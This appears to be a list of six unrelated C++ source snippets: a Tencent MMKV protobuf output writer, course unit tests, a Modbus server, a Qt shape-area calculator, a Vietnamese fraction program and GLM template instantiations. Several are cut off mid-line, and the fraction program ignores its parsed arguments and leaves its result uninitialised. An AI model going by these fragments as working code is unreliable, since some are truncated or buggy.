    "/*\n * Tencent is pleased to support the open source community by making\n * MMKV available.\n *\n * Copyright (C) 2018 THL A29 Limited, a Tencent company.\n * All rights reserved.\n *\n * Licensed under the BSD 3-Clause License (the \"License\"); you may not use\n * this file except in compliance with the License. You may obtain a copy of\n * the License at\n *\n *       https://opensource.org/licenses/BSD-3-Clause\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"CodedOutputData.h\"\n#include \"PBUtility.h\"\n#include <cstring>\n#include <stdexcept>\n\n#ifdef MMKV_APPLE\n#    if __has_feature(objc_arc)\n#        error This file must be compiled with MRC. Use -fno-objc-arc flag.\n#    endif\n#endif // MMKV_APPLE\n\nusing namespace std;\n\nnamespace mmkv {\n\nCodedOutputData::CodedOutputData(void *ptr, size_t len) : m_ptr((uint8_t *) ptr), m_size(len), m_position(0) {\n    MMKV_ASSERT(m_ptr);\n}\n\nuint8_t *CodedOutputData::curWritePointer() {\n    return m_ptr + m_position;\n}\n\nvoid CodedOutputData::writeDouble(double value) {\n    this->writeRawLittleEndian64(Float64ToInt64(value));\n}\n\nvoid CodedOutputData::writeFloat(float value) {\n    this->writeRawLittleEndian32(Float32ToInt32(value));\n}\n\nvoid CodedOutputData::writeInt64(int64_t value) {\n    this->writeRawVarint64(value);\n}\n\nvoid CodedOutputData::writeUInt64(uint64_t value) {\n    writeRawVarint64(static_cast<int64_t>(value));\n}\n\nvoid CodedOutputData::writeInt32(int32_t value) {\n    if (value >= 0) {\n        this->writeRawVarint32(value);\n    } else {\n        this->writeRawVarint64(value);\n    }\n}\n\nvoid CodedOutputData::writeUInt32(uint32_t value) {\n    writeRawVarint32(static_cast<int32_t>(value));\n}\n\nvoid CodedOutputData::writeBool(bool value) {\n    this->writeRawByte(static_cast<uint8_t>(value ? 1 : 0));\n}\n\nvoid CodedOutputData::writeData(const MMBuffer &value) {\n    this->writeRawVarint32((int32_t) value.length());\n    this->writeRawData(value);\n}\n\n#ifndef MMKV_APPLE\n\nvoid CodedOutputData::writeString(const string &value) {\n    size_t numberOfBytes = value.size();\n    this->writeRawVarint32((int32_t) numberOfBytes);\n    if (m_position + numberOfBytes > m_size) {\n        auto msg = \"m_position: \" + to_string(m_position) + \", numberOfBytes: \" + to_string(numberOfBytes) +\n                   \", m_size: \" + to_string(m_size);\n        throw out_of_range(msg);\n    }\n    memcpy(m_ptr + m_position, ((uint8_t *) value.data()), numberOfBytes);\n    m_position += numberOfBytes;\n}\n\n#endif // MMKV_APPLE\n\nsize_t CodedOutputData::spaceLeft() {\n    if (m_size <= m_position) {\n        return 0;\n    }\n    return m_size - m_position;\n}\n\nvoid CodedOutputData::seek(size_t addedSize) {\n    m_position += addedSize;\n\n    if (m_position > m_size) {\n        throw out_of_range(\"OutOfSpace\");\n    }\n}\n\nvoid CodedOutputData::reset() {\n    m_position = 0;\n}\n\nsize_t CodedOutputData::getPosition() {\n    return m_position;\n}\n\nvoid CodedOutputData::setPosition(size_t position) {\n    m_position = position;\n}\n\nvoid CodedOutputData::writeRawByte(uint8_t value) {\n    if (m_position == m_size) {\n        throw out_of_range(\"m_position: \" + to_string(m_position) + \" m_size: \" + to_string(m_size));\n        return;\n    }\n\n    m_ptr[m_position++] = value;\n}\n\nvoid CodedOutputData::writeRawData(const MMBuffer &data) {\n    size_t numberOfBytes = data.length();\n    if (m_position + numberOfBytes > m_size) {\n        auto msg = \"m_position: \" + to_string(m_position) + \", numberOfBytes: \" + to_string(numberOfBytes) +\n                   \", m_size: \" + to_string(m_size);\n        throw out_of_range(msg);\n    }\n    memcpy(m_ptr + m_position, data.getPtr(), numberOfBytes);\n    m_position += numberOfBytes;\n}\n\nvoid CodedOutputData::writeRawVarint32(int32_t value) {\n    while (true) {\n        if ((value & ~0x7f) == 0) {\n            this->writeRawByte(static_cast<uint8_t>(value));\n            return;\n        } else {\n            this->writeRawByte(static_cast<uint8_t>((value & 0x7F) | 0x80));\n            value = logicalRightShift32(value, 7);\n        }\n    }\n}\n\nvoid CodedOutputData::writeRawVarint64(int64_t value) {\n    while (true) {\n        if ((value & ~0x7f) == 0) {\n            this->writeRawByte(static_cast<uint8_t>(value));\n            return;\n        } else {\n            this->writeRawByte(static_cast<uint8_t>((value & 0x7f) | 0x80));\n            value = logicalRightShift64(value, 7);\n        }\n    }\n}\n\nvoid CodedOutputData::writeRawLittleEndian32(int32_t value) {\n    this->writeRawByte(static_cast<uint8_t>((value) &0xff));\n    this->writeRawByte(static_cast<uint8_t>((value >> 8) & 0xff));\n    this->writeRawByte(static_cast<uint8_t>((value >> 16) & 0xff));\n    this->writeRawByte(static_cast<uint8_t>((value >> 24) & 0xff));\n}\n\nvoid CodedOutputData::writeRawLi",
    "/** @file assg07-tests.cpp\n *\n * @brief Unit tests for Assignment 07: Static Variables, Default Parameters and Function Overloading\n *\n * @author Derek Harter\n * @note   class: COSC 1437, Fall 2024\n * @note   ide  : VS Code 1.92.2\n * @date   September 15, 2024\n *\n * Assignment unit tests.  This file contains tests of the work you do\n * for the individual tasks for the assignment.  You should perform the\n * tasks in order, from Task 1 through the last task.  To start a task,\n * change the `#undef` statement to `#define`.  This will enable the test\n * cases for that task.\n */\n#include \"assg07-library.hpp\"\n#include \"catch.hpp\"\nusing namespace std;\n\n// change these to #define when ready to begin working on each task,\n// once defined they will enable the tests declared below for each task\n#undef task1\n#undef task2\n#undef task3\n#define predefined\n\n/** nextFibonacciNumber() test cases\n * Create a function called nextFibonacciNumber() to pass\n * the following tests as described in the assignment description.\n */\n#ifdef task1\nTEST_CASE(\"Task 1 <nextFibonacciNumber()> tests\", \"[task1]\")\n{\n  // have to reset the sequence to ensure initialized, by\n  // default will return fib_1 == 1\n  CHECK(nextFibonacciNumber(true) == 1);\n\n  // after reset we should have set fib_0 = 0 and fib_1 = 1 and start\n  // generating from fib_2, so sequence 1, 2, 3, 5, 8, 13, 21, 34...\n  CHECK(nextFibonacciNumber() == 1);\n  CHECK(nextFibonacciNumber() == 2);\n  CHECK(nextFibonacciNumber() == 3);\n  CHECK(nextFibonacciNumber() == 5);\n  CHECK(nextFibonacciNumber() == 8);\n  CHECK(nextFibonacciNumber() == 13);\n  CHECK(nextFibonacciNumber() == 21);\n  CHECK(nextFibonacciNumber() == 34);\n  CHECK(nextFibonacciNumber() == 55);\n  CHECK(nextFibonacciNumber() == 89);\n  CHECK(nextFibonacciNumber() == 144);\n  CHECK(nextFibonacciNumber() == 233);\n  CHECK(nextFibonacciNumber() == 377);\n\n  // test reset in middle of sequence begins generating from fib_1 again\n  CHECK(nextFibonacciNumber(true) == 1);\n  CHECK(nextFibonacciNumber() == 1);\n  CHECK(nextFibonacciNumber() == 2);\n  CHECK(nextFibonacciNumber() == 3);\n  CHECK(nextFibonacciNumber() == 5);\n  CHECK(nextFibonacciNumber() == 8);\n  CHECK(nextFibonacciNumber() == 13);\n  CHECK(nextFibonacciNumber() == 21);\n  CHECK(nextFibonacciNumber() == 34);\n  CHECK(nextFibonacciNumber() == 55);\n  CHECK(nextFibonacciNumber() == 89);\n  CHECK(nextFibonacciNumber() == 144);\n  CHECK(nextFibonacciNumber() == 233);\n  CHECK(nextFibonacciNumber() == 377);\n  CHECK(nextFibonacciNumber() == 610);\n  CHECK(nextFibonacciNumber() == 987);\n}\n#endif\n\n\n/** swap() char test cases\n * Create an overloaded function called swap() to pass\n * the following tests as described in the assignment description.\n */\n#ifdef task2\nTEST_CASE(\"Task 2 <swap()> of char parameters> tests\", \"[task2]\")\n{\n  // to pass by value, we need local variables\n  char a;\n  char b;\n\n  // swap two values\n  a = 'C';\n  b = 'M';\n  swap(a, b);\n  CHECK(a == 'M');\n  CHECK(b == 'C');\n\n  // and swap back\n  swap(a, b);\n  CHECK(a == 'C');\n  CHECK(b == 'M');\n\n  // a few more tests\n  char c = 'X';\n  swap(a, c);\n  CHECK(a == 'X');\n  CHECK(b == 'M');\n  CHECK(c == 'C');\n\n  swap(a, b);\n  CHECK(a == 'M');\n  CHECK(b == 'X');\n  CHECK(c == 'C');\n\n  swap(b, c);\n  CHECK(a == 'M');\n  CHECK(b == 'C');\n  CHECK(c == 'X');\n\n  // everything back to where we started\n  swap(a, b);\n  CHECK(a == 'C');\n  CHECK(b == 'M');\n  CHECK(c == 'X');\n}\n#endif\n\n\n/** threeSort() of char test cases\n * Create a function called threeSort() to pass\n * the following tests as described in the assignment description.\n */\n#ifdef task2\nTEST_CASE(\"Task2 <threeSort()> of char parameters  tests\", \"[task2]\")\n{\n  char a, b, c;\n\n  // already sorted\n  a = 'x'; b = 'y'; c = 'z';\n  threeSort(a, b, c);\n  CHECK(a == 'x');\n  CHECK(b == 'y');\n  CHECK(c == 'z');\n  \n  // in reverse order\n  a = 'z'; b = 'y'; c = 'x';\n  threeSort(a, b, c);\n  CHECK(a == 'x');\n  CHECK(b == 'y');\n  CHECK(c == 'z');\n\n\n  // all other possible permutations\n  a = 'x'; b = 'z'; c = 'y';\n  threeSort(a, b, c);\n  CHECK(a == 'x');\n  CHECK(b == 'y');\n  CHECK(c == 'z');\n\n  a = 'y'; b = 'z'; c = 'x';\n  threeSort(a, b, c);\n  CHECK(a == 'x');\n  CHECK(b == 'y');\n  CHECK(c == 'z');\n\n  a = 'y'; b = 'x'; c = 'z';\n  threeSort(a, b, c);\n  CHECK(a == 'x');\n  CHECK(b == 'y');\n  CHECK(c == 'z');\n\n  a = 'z'; b = 'x'; c = 'y';\n  threeSort(a, b, c);\n  CHECK(a == 'x');\n  CHECK(b == 'y');\n  CHECK(c == 'z');\n}\n#endif\n\n\n/** swap() string test cases\n * Create an overloaded function called swap() to pass\n * the following tests as described in the assignment description.\n */\n#ifdef task3\nTEST_CASE(\"Task 3 <swap()> of string parameters> tests\", \"[task3]\")\n{\n  // to pass by value, we need local variables\n  string a;\n  string b;\n\n  // swap two values\n  a = \"California\";\n  b = \"Michigan\";\n  swap(a, b);\n  CHECK(a == \"Michigan\");\n  CHECK(b == \"California\");\n\n  // and swap back\n  swap(a, b);\n  CHECK(a == \"California\");\n  CHECK(b == \"Michigan\");\n\n  // a few more tests\n  string c = \"Wyoming\";\n  swap(a, c);\n  CHEC",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <modbus/modbus.h>\n#include <nlohmann/json.hpp> // nlohmann/json \u0434\u043b\u044f \u0440\u0430\u0431\u043e\u0442\u044b \u0441 JSON\n\nusing namespace std;\n\n#define TAG_COUNT 1000  // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u043e\u0432\n\nint registers[TAG_COUNT] = {0};  // \u0425\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u043e\u0432 ModBus\n\nusing json = nlohmann::json;\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0438 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\nint load_config(const string& filename, string &mode, int &port, string &serial_port, int &baud_rate, char &parity, int &data_bits, int &stop_bits) {\n    ifstream file(filename);\n    if (!file.is_open()) {\n        cerr << \"Error opening config file.\" << endl;\n        return -1;\n    }\n\n    json config;\n    try {\n        file >> config;  // \u0427\u0442\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0432 \u043e\u0431\u044a\u0435\u043a\u0442 JSON\n    } catch (json::parse_error& e) {\n        cerr << \"JSON parse error: \" << e.what() << endl;\n        return -1;\n    }\n    file.close();\n\n    // \u0427\u0442\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432\n    mode = config.at(\"mode\").get<string>();                 // \u0420\u0435\u0436\u0438\u043c (TCP \u0438\u043b\u0438 RTU)\n    port = config.at(\"port\").get<int>();                          // TCP \u043f\u043e\u0440\u0442\n    serial_port = config.at(\"serial_port\").get<string>();    // \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u043f\u043e\u0440\u0442 \u0434\u043b\u044f RTU\n    baud_rate = config.at(\"baud_rate\").get<int>();                // \u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0434\u043b\u044f RTU\n    parity = config.at(\"parity\").get<string>()[0];           // \u0427\u0435\u0442\u043d\u043e\u0441\u0442\u044c (\u0441\u0438\u043c\u0432\u043e\u043b)\n    data_bits = config.at(\"data_bits\").get<int>();                // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0438\u0442 \u0434\u0430\u043d\u043d\u044b\u0445\n    stop_bits = config.at(\"stop_bits\").get<int>();                // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0442\u043e\u043f-\u0431\u0438\u0442\u043e\u0432\n\n    // \u0427\u0442\u0435\u043d\u0438\u0435 \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u044b\u0445 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u043e\u0432\n    const json& json_registers = config.at(\"registers\"); // \u0441\u043e\u0437\u0434\u0430\u0451\u0442\u0441\u044f \u043f\u043e\u0441\u0442\u043e\u044f\u043d\u043d\u0430\u044f \u0441\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u044d\u0442\u043e\u0442 JSON-\u043c\u0430\u0441\u0441\u0438\u0432, \u0447\u0442\u043e\u0431\u044b \u0438\u0437\u0431\u0435\u0436\u0430\u0442\u044c \u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f \u0434\u0430\u043d\u043d\u044b\u0445\n    for (size_t i = 0; i < json_registers.size() && i < TAG_COUNT; ++i) {\n        registers[i] = json_registers[i].get<int>();\n    }\n\n    return 0;\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0442\u0435\u043a\u0443\u0449\u0438\u0445 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438\nvoid save_config(const string& filename) {\n    json config;\n\n    // \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u043e\u0432\n    config[\"registers\"] = json::array();\n    for (int i = 0; i < TAG_COUNT; ++i) {\n        config[\"registers\"].push_back(registers[i]); // push_back \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u043a\u0430\u0436\u0434\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430 \u0432 \u043c\u0430\u0441\u0441\u0438\u0432 registers \u0432\u043d\u0443\u0442\u0440\u0438 \u043e\u0431\u044a\u0435\u043a\u0442\u0430 config.\n    }\n\n    // \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0435 \u0432 \u0444\u0430\u0439\u043b\n    ofstream file(filename);\n    if (!file.is_open()) {\n        cerr << \"Error opening config file for saving.\" << endl;\n        return;\n    }\n    file << config.dump(4);  // \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u043c \u0432 \u0444\u0430\u0439\u043b \u0441 \u0444\u043e\u0440\u043c\u0430\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435\u043c\n    file.close();\n}\n\nint main() {\n    string mode, serial_port;\n    int port, baud_rate, data_bits, stop_bits;\n    char parity;\n\n    // \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438\n    if (load_config(\"config.json\", mode, port, serial_port, baud_rate, parity, data_bits, stop_bits) == -1) {\n        return -1;\n    }\n\n    modbus_t *ctx; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0443 modbus_t, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u0430 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f \u0441 Modbus \u0441\u0435\u0440\u0432\u0435\u0440\u043e\u043c\n    \n    if (mode == \"TCP\") {\n        // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442 ModBus TCP\n        ctx = modbus_new_tcp(\"127.0.0.1\", port);\n        if (ctx == NULL) {\n            cerr << \"Unable to create Modbus TCP context\" << endl;\n            return -1;\n        }\n    } else if (mode == \"RTU\") {\n        // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442 ModBus RTU\n        ctx = modbus_new_rtu(serial_port.c_str(), baud_rate, parity, data_bits, stop_bits); // \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u0434\u043b\u044f \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 \u043f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u043f\u043e\u0440\u0442\u0430\n        if (ctx == NULL) {\n            cerr << \"Unable to create Modbus RTU context\" << endl;\n            return -1;\n        }\n\n        // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440 \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0430 (Slave ID)\n        modbus_set_slave(ctx, 1); // \u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u0442 \u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440 Slave ID \u0440\u0430\u0432\u043d\u044b\u0439 1 \u0434\u043b\u044f \u043f\u043e\u0434\u0447\u0438\u043d\u0435\u043d\u043d\u043e\u0433\u043e \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0430 \u0432 \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u0435 Modbus RTU\n    } else {\n        cerr << \"Unknown mode specified in config: \" << mode << endl;\n        return -1;\n    }\n\n    // \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0430\u0435\u043c\u0441\u044f\n    cerr << \"Attempting to connect to ModBus server\" << endl;\n    if (modbus_connect(ctx) == -1) {\n        cerr << \"Connection failed \" << modbus_strerror(errno) << endl;\n        modbus_free(ctx);\n        return -1;\n    }\n    cerr << \"Connected successfully\" << endl;\n\n    // \u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0446\u0438\u043a\u043b \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 ModBus \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432\n    for (;;) {\n        uint8_t query[MODBUS_TCP_MAX_ADU_LENGTH]; //\u041c\u0430\u0441\u0441\u0438\u0432 \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0437\u0430\u043f\u0440\u043e\u0441\u0430\n        int reception = modbus_receive(ctx, query); // \u041f\u0440\u0438\u0451\u043c \u0437\u0430\u043f\u0440\u043e\u0441\u0430 \u043e\u0442 \u0432\u0435\u0434\u0443\u0449\u0435\u0433\u043e \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0430. reception \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u0442 \u043d\u0430 \u043a\u043e\u043b-\u0432\u043e \u0431\u0430\u0439\u0442\u043e\u0432 \u0432 \u0437\u0430\u043f\u0440\u043e\u0441\u0435\n        // \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0433\u043e \u0437\u0430\u043f\u0440\u043e\u0441\u0430\n        if (reception > 0) {\n            modbus_reply(ctx, query, reception, NULL); // \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u0442 \u043e\u0442\u0432\u0435\u0442 \u043d\u0430 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u044b\u0439 \u0437\u0430\u043f\u0440\u043e\u0441\n            save_config(\"config.json\");  // \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u043e\u0432\n        } else if (reception == -1) {\n            // \u041e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u043e\u0448\u0438\u0431\u043a\u0443\n            cerr << \"Error during communication\" << endl;\n            break;\n        }\n    }\n\n    // \u041e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0430\u0435\u043c \u0440\u0435\u0441\u0443\u0440\u0441\u044b\n    modbus_free(ctx);\n    return 0;\n}",
    "#include \"calculationwindow.h\"\n#include \"ui_calculationwindow.h\"\n#include \"shapes.h\"\n#include \"mainwindow.h\"\n#include <QDebug>\n#include <QMessageBox>\n\n\nCalculationWindow::CalculationWindow(QWidget *parent, const QString &figure) :\n    QDialog(parent),\n    ui(new Ui::CalculationWindow),\n    figure(figure)\n{\n    ui->setupUi(this);\n\n    if (figure == \"Square\") {\n        ui->label->setText(\"Enter side length\");\n        ui->lineEdit_2->setVisible(false);\n        ui->lineEdit_3->setVisible(false);\n    } else if (figure == \"Rectangle\" || (figure == \"Parallelogram\" || figure == \"Triangle\")) {\n        ui->label->setText(\"Enter base and height\");\n        ui->lineEdit_2->setVisible(true);\n        ui->lineEdit_3->setVisible(false);\n    } else if (figure == \"Rhombus\") {\n        ui->label->setText(\"Enter diagonals\");\n        ui->lineEdit_2->setVisible(true);\n        ui->lineEdit_3->setVisible(false);\n    } else if (figure == \"Circle\") {\n        ui->label->setText(\"Enter radius\");\n        ui->lineEdit_2->setVisible(false);\n        ui->lineEdit_3->setVisible(false);\n    } else if (figure == \"Sector\") {\n        ui->label->setText(\"Enter radius and angle\");\n        ui->lineEdit_2->setVisible(true);\n        ui->lineEdit_3->setVisible(false);\n    } else if (figure == \"Trapezoid\") {\n        ui->label->setText(\"Enter base1, base2 and diagonal\");\n        ui->lineEdit_2->setVisible(true);\n        ui->lineEdit_3->setVisible(true);\n    }\n\n    connect(ui->lineEdit, &QLineEdit::returnPressed, this, &CalculationWindow::calculateArea);\n    connect(ui->lineEdit_2, &QLineEdit::returnPressed, this, &CalculationWindow::calculateArea);\n    connect(ui->lineEdit_3, &QLineEdit::returnPressed, this, &CalculationWindow::calculateArea);\n    setFormula(figure);\n\n    connect(ui->pushButton, &QPushButton::clicked, this, &CalculationWindow::on_buttClean_clicked);\n\n}\nvoid CalculationWindow::on_buttClean_clicked()\n{\n        ui->lineEdit->clear();\n        ui->lineEdit_2->clear();\n        ui->lineEdit_3->clear();\n        ui->label_2->clear();\n\n}\n\nCalculationWindow::~CalculationWindow()\n{\n    delete ui;\n}\n\nvoid CalculationWindow::calculateArea()\n{\n    double result = 0;\n\n    double input1 = ui->lineEdit->text().toDouble();\n    double input2 = ui->lineEdit_2->text().toDouble();\n    double input3 = ui->lineEdit_3->text().toDouble();\n\n    if (figure == \"Square\") {\n        result = shapes.square(input1);\n    } else if (figure == \"Rectangle\") {\n        result = shapes.rectangle(input1, input2);\n    } else if (figure == \"Triangle\") {\n        result = shapes.triangle(input1, input2);\n    }\n    else if (figure == \"Parallelogram\") {\n        result = shapes.parallelogram(input1, input2);\n    } else if (figure == \"Rhombus\") {\n        result = shapes.rhombus(input1, input2);\n    } else if (figure == \"Circle\") {\n        result = shapes.circle(input1);\n    } else if (figure == \"Sector\") {\n        result = shapes.sector(input1, input2);\n    } else if (figure == \"Trapezoid\") {\n        result = shapes.trapezoid(input1, input2, input3);\n    }\n\n    ui->label->setText(\"Area: \" + QString::number(result));\n\n}\n\n\nvoid CalculationWindow::setShapeImage(const QString &shape)\n{\n    QPixmap pixmap;\n    if (shape == \"Square\") {\n        pixmap.load(\":/i/squar.jfif\");\n    } else if (shape == \"Circle\") {\n        pixmap.load(\":/i/circle.jfif\");\n    } else if (shape == \"Triangle\") {\n        pixmap.load(\":/i/triang.png\");\n    } else if (shape == \"Sector\") {\n        pixmap.load(\":/i/sec.png\");\n    } else if (shape == \"Parallelogram\") {\n            pixmap.load(\":/i/par.png\");\n    }  else if (shape == \"Trapezoid\") {\n        pixmap.load(\":/i/trap.jfif\");\n    }  else if (shape == \"Rectangle\") {\n        pixmap.load(\":/i/rect.png\");\n    }  else if (shape == \"Rhombus\") {\n        pixmap.load(\":/i/rho.jpg\");\n    }\n\n\n    if (!pixmap.isNull()) {\n        ui->label_2->setPixmap(pixmap);\n    } else {\n        qDebug() << \"Failed to load image for shape: \" << shape;\n    }\n}\n\nvoid CalculationWindow::setFormula(const QString &shape)\n{\n    QString formula;\n\n    if (shape == \"Square\") {\n        formula = \"Area = a^2\";\n    } else if (shape == \"Rectangle\") {\n        formula = \"Area = a \u00d7 b\";\n    } else if (shape == \"Triangle\") {\n        formula = \"Area = (1/2)\u00d7 base \u00d7 height\";\n    } else if (shape == \"Parallelogram\") {\n        formula = \"Area = base \u00d7 height\";\n    } else if (shape == \"Rhombus\") {\n        formula = \"Area = (1/2) \u00d7 d1 \u00d7 d2\";\n    } else if (shape == \"Circle\") {\n        formula = \"Area = \u03c0 \u00d7 r^2\";\n    } else if (shape == \"Sector\") {\n        formula = \"Area = (1/2) \u00d7 r^2 \u00d7 \u03b8\";\n    } else if (shape == \"Trapezoid\") {\n        formula = \"Area = (1/2) \u00d7 (a + b) \u00d7 h\";\n    }\n\n    ui->label_7->setText(formula);\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\nusing namespace std;\nclass phanso {\nprivate:\n    int tu, mau;\npublic:\n    void nhap();\n    void xuat();\n    void cong(phanso);\n    void tru(phanso);\n    void nhan(phanso);\n    void chia(phanso);\n};\nvoid phanso::nhap() {\n    cout << \"Nhap phan so: \" << endl;\n    cin >> tu >> mau;\n}\nvoid phanso::xuat() {\n    cout << tu << \"/\" << mau << endl;\n}\nvoid phanso::cong(phanso a) {\n    tu = tu * a.mau + mau * a.tu;\n    mau = mau * a.mau;\n}\nvoid phanso::tru(phanso a) {\n    tu = tu * a.mau - mau * a.tu;\n    mau = mau * a.mau;\n}\nvoid phanso::nhan(phanso a) {\n    tu = tu * a.tu;\n    mau = mau * a.mau;\n}\nvoid phanso::chia(phanso a) {\n    tu = tu * a.mau;\n    mau = mau * a.tu;\n}\nint main(int argc, const char* argv[]) {\n    string command = argv[1];\n    if (command.compare(\"sum\") == 0) {\n        phanso kq;\n        for (int i = 2; i < argc; i += 2) {\n            int tu = stoi(argv[i]);\n            int mau = stoi(argv[i + 1]);\n            phanso temp;\n            temp.nhap();\n            kq.cong(temp);\n        }\n        cout << \"Tong cac phan so: \";\n        kq.xuat();\n        cout << \"Done!\";\n    }\n    return 0;\n}\n",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct 